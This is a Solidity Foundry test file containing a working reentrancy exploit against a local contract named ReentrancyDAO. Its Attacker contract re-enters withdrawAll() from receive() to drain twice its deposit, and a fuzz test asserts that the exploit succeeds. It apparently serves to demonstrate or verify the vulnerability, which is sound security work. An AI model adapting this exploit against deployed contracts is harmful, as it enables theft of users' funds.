
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ReentrancyDAO} from "../src/ReentrancyDAO.sol";

contract TestReentrancyReentrancyDAO is Test {

    ReentrancyDAO public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ReentrancyDAO();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal > 0 && attackVal < type(uint128).max);
        

        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        _contractUnderTest.deposit{value: attackVal}();
        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ReentrancyDAO public dao;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    constructor(address victimAddress) { 
        dao = ReentrancyDAO(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        dao.deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        dao.withdrawAll();

        if (address(this).balance == initialSnapshot + val * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            dao.withdrawAll();
        }
    }
}
